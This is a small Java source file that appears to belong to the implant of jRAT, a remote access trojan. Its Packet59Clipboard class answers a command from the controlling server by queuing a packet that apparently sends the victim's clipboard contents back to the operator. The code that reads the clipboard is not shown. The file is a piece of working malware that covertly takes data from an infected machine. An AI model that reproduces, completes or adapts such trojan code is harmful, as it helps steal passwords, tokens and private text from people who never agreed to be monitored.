package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet41Clipboard;

public class Packet59Clipboard extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Connection.instance.addToSendQueue(new Packet41Clipboard());
	}

}
